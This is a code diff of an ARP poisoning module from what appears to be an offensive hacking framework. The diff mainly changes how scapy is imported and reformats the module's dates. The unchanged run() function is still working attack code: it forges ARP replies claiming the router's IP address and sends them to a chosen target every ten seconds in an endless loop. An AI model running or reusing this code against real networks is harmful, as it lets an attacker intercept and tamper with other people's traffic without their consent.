@@ -5,7 +5,7 @@ import os
 import signal
 from time import sleep
 import logging
-from scapy.all import *
+import scapy.all as scapy
 from core import colors
 
 conf = {
@@ -15,8 +15,8 @@ conf = {
     "author": "4shadoww",
     "github": "4shadoww",
     "email": "4shadoww0@gmail.com",
-    "initdate": "24.2.2016",
-    "lastmod": "29.12.2016",
+    "initdate": "2016-02-24",
+    "lastmod": "2021-07-11",
     "apisupport": False,
     "needroot": 1
 }
@@ -36,9 +36,9 @@ changelog = "Version 1.0:\nrelease"
 def run():
     print_info("arp poisoning has been started!")
     print_info("[*] ctrl + c to end")
-    packet = ARP()
+    packet = scapy.ARP()
     packet.psrc = variables['router'][0]
     packet.pdst = variables['target'][0]
     while 1:
-        send(packet, verbose=False)
+        scapy.send(packet, verbose=False)
         sleep(10)
